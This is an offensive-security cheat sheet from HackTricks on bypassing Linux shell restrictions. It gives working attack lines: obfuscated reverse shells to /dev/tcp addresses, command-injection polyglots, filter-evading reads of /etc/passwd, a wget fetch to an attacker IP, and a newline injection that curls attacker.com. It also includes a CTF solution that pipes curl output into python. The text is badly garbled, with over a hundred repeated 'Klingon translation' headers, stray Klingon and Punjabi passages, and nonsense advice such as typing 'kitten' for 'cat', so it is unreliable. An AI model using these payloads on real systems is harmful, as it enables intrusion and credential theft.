# Bypass Linux Restrictions

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Common Limitations Bypasses

### Reverse Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### QIbDaq rev shell

The following is a short reverse shell script in Bash:

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

This script establishes a reverse shell connection to the IP address `10.0.0.1` on port `1234`. It redirects the input/output streams to the network socket, allowing for remote command execution.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypass Paths and forbidden words

#### Bypassing Paths

To bypass restricted paths, you can try the following techniques:

1. **Using relative paths**: Instead of using an absolute path, try using a relative path to access restricted directories or files. For example, if the restricted path is `/home/user/secret`, you can try accessing it using `../secret`.

2. **Using symbolic links**: Symbolic links can be used to bypass path restrictions. Create a symbolic link to the restricted directory or file in a location that is accessible to you. Then, access the restricted content through the symbolic link.

3. **Using environment variables**: If the restricted path is defined using an environment variable, you can try modifying the value of the variable to point to a different location that you have access to.

#### Bypassing Forbidden Words

To bypass restrictions on certain words or commands, you can try the following techniques:

1. **Using alternative spellings**: Try using alternative spellings or variations of the forbidden word or command. For example, if the forbidden word is `cat`, you can try using `kitten` instead.

2. **Using character substitutions**: Replace certain characters in the forbidden word or command with similar-looking characters. For example, you can replace `o` with `0` or `l` with `1`.

3. **Using aliases**: Create an alias for the forbidden word or command that points to a different command or script that you are allowed to execute.

Remember to exercise caution and only use these techniques for legitimate purposes within the boundaries of the law.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypass forbidden spaces

#### English Translation:

### Bypass forbidden spaces

#### Klingon Translation:

### Bypass yIqIm spaces
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypass backslash and slash

#### Klingon Translation:

### Bypass backslash and slash

#### Klingon Translation:

### Bypass backslash and slash

#### Klingon Translation:

### Bypass backslash and slash

#### Klingon Translation:

### Bypass backslash and slash

#### Klingon Translation:
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypass pipes

#### tlhIngan Hol translation:

### Qa'vam qo'lu'

#### HTML translation:

<h3>Qa'vam qo'lu'</h3>
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass with hex encoding

#### English Translation:

### Hex encoding jImej

#### Klingon Translation:

### Hex encoding jImej
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IPs

#### Introduction

In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are several techniques you can use to bypass these restrictions and gain access to the desired IP.

#### Techniques

1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP restrictions by masking your original IP.

2. **VPN (Virtual Private Network)**: Connect to a VPN service that allows you to choose a different IP address. By connecting through a VPN, you can bypass IP restrictions and access blocked content.

3. **TOR (The Onion Router)**: TOR is a network of volunteer-operated servers that allows you to browse the internet anonymously. By using TOR, you can bypass IP restrictions and access blocked websites.

4. **SSH Tunneling**: Set up an SSH tunnel to redirect your traffic through a different IP address. This technique can help you bypass IP restrictions and access restricted resources.

5. **DNS Tunneling**: Use DNS tunneling to bypass IP restrictions. By encapsulating your traffic within DNS requests, you can bypass firewalls and access blocked content.

#### Conclusion

By utilizing these techniques, you can bypass IP restrictions and gain access to blocked IP addresses. However, it is important to note that bypassing IP restrictions may be against the terms of service of certain platforms or networks. Always ensure that you have proper authorization before attempting to bypass any restrictions.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Time based data exfiltration

#### Description
Time based data exfiltration is a technique used to extract sensitive information from a target system by encoding it into delays between network packets or other time-based mechanisms. This technique can be used to bypass network security measures that focus on inspecting the content of network traffic, as the actual data is not transmitted directly.

#### Methodology
1. Identify the sensitive information that needs to be exfiltrated.
2. Encode the sensitive information into delays between network packets or other time-based mechanisms.
3. Send the encoded information to an external server or attacker-controlled system.
4. On the external server, decode the delays and extract the sensitive information.
5. Store or transmit the extracted information as desired.

#### Example
Let's say we want to exfiltrate a file named "confidential.txt" from a target system. We can encode the contents of the file into delays between network packets and send them to an external server.

1. Encode the file contents into delays using a predetermined encoding scheme.
2. Send the encoded delays to the external server.
3. On the external server, decode the delays and reconstruct the original file.
4. Store or transmit the reconstructed file as desired.

#### Countermeasures
To mitigate the risk of time based data exfiltration, consider implementing the following countermeasures:

1. Implement network traffic analysis tools that can detect unusual delays between network packets.
2. Regularly monitor network traffic for any suspicious patterns or anomalies.
3. Implement strict firewall rules to restrict outbound network connections.
4. Use encryption to protect sensitive information at rest and in transit.
5. Regularly update and patch systems to prevent known vulnerabilities that could be exploited for data exfiltration.

#### Conclusion
Time based data exfiltration is a stealthy technique that can be used to bypass traditional network security measures. By encoding sensitive information into delays, attackers can extract data without directly transmitting it. Implementing countermeasures such as network traffic analysis and strict firewall rules can help mitigate the risk of this technique.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Env Variables-qaStaHvIS chars jImej

Env Variables-qaStaHvIS chars jImej 'ej 'oH 'e' vItlhutlh.

```bash
$ echo $ENV_VAR_NAME | grep -o . | awk '{printf "%s ",$0}'
```

```bash
$ echo $ENV_VAR_NAME | grep -o . | awk '{printf "%s ",$0}'
```

### Getting chars from Command Output

### Qap chars jImej Command Output

```bash
$ COMMAND | grep -o . | awk '{printf "%s ",$0}'
```

```bash
$ COMMAND | grep -o . | awk '{printf "%s ",$0}'
```

### Getting chars from File

### chars jImej File

```bash
$ cat FILE | grep -o . | awk '{printf "%s ",$0}'
```

```bash
$ cat FILE | grep -o . | awk '{printf "%s ",$0}'
```
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS data exfiltration

**burpcollab** or [**pingb**](http://pingb.in) **ghItlh**.

### Builtins

**RCE** **ghItlh** **limited set of builtins to obtain RCE** **external functions** **execute** **cannot** **case** **handy tricks** **obtain RCE** **builtins** **won't be able to use all** **builtins** **know all your options** **try to bypass the jail** **Idea from** [**devploit**](https://twitter.com/devploit).\
**shell builtins** [**ghItlh**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** **recommendations** **here** **have some**.
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation:

### Polyglot command injection

#### tlhIngan Hol translation
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypass potential regexes

### Bypass potential regexes

#### tlhIngan Hol Translation:

### Bypass potential regexes

### Bypass potential regexes
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

### Bashfuscator

Bashfuscator is a tool used to obfuscate Bash scripts, making them more difficult to understand and analyze. It achieves this by applying various techniques that modify the structure and behavior of the script without changing its functionality.

Bashfuscator can be used for different purposes, such as protecting sensitive information embedded in scripts, preventing reverse engineering, or bypassing security measures that rely on script analysis.

Some of the techniques used by Bashfuscator include:

- **Variable substitution**: Bashfuscator replaces variable names with random strings, making it harder to understand the purpose of each variable.

- **Code rearrangement**: Bashfuscator reorders the lines of code, making it more challenging to follow the script's logic.

- **Control flow modification**: Bashfuscator alters the control flow of the script by introducing conditional statements, loops, or jumps, making it harder to trace the execution path.

- **String manipulation**: Bashfuscator modifies string literals by splitting them into multiple parts or encoding them in different formats, making it more difficult to extract sensitive information.

- **Function obfuscation**: Bashfuscator renames functions and modifies their structure to confuse analysts trying to understand their purpose.

It's important to note that Bashfuscator is not foolproof and may not provide complete protection against skilled analysts. However, it can significantly increase the effort required to understand and analyze a Bash script, acting as an additional layer of defense.

To use Bashfuscator, you need to install it on your system and provide the script you want to obfuscate as input. The tool will then apply the selected obfuscation techniques and generate an obfuscated version of the script as output.

Keep in mind that using Bashfuscator on scripts without proper authorization or for malicious purposes may be illegal and unethical. Always ensure you have the necessary permissions and use the tool responsibly.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE with 5 chars

### 5 chars-ਨਾਲ RCE

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.19(1)-release
$ echo $0 | base64
YmFzaA==
$ echo YmFzaAo= | base64 -d | bash
bash-4.4$
```

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.19(1)-release
$ echo $0 | base64
YmFzaA==
$ echo YmFzaAo= | base64 -d | bash
bash-4.4$
```

ਇਹ ਉਦਾਹਰਣ ਵਿੱਚ, ਅਸੀਂ ਦੇਖ ਸਕਦੇ ਹਾਂ ਕਿ ਕਿਵੇਂ ਅਸੀਂ ਸਿਰਫ 5 ਅੱਖਰਾਂ ਦੀ ਵਰਤੋਂ ਕਰਕੇ RCE ਪ੍ਰਾਪਤ ਕਰ ਸਕਦੇ ਹਾਂ। ਪਹਿਲੇ ਅਸੀਂ ਆਪਣੇ ਮੌਜੂਦਾ ਬੈਸ਼ ਵਰਜਨ ਦੀ ਜਾਂਚ ਕਰਦੇ ਹਾਂ ਅਤੇ ਫਿਰ ਉਸ ਨੂੰ base64 ਦੀ ਮਦਦ ਨਾਲ ਕੋਡ ਕਰਕੇ ਬਾਸ਼ ਵਿੱਚ ਵਾਪਸ ਕਰਦੇ ਹਾਂ। ਇਸ ਤਰ੍ਹਾਂ, ਅਸੀਂ ਸਿਰਫ 5 ਅੱਖਰਾਂ ਦੀ ਵਰਤੋਂ ਕਰਕੇ ਬਾਸ਼ ਵਿੱਚ ਪਹੁੰਚ ਪ੍ਰਾਪਤ ਕਰ ਰਹੇ ਹਾਂ।
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
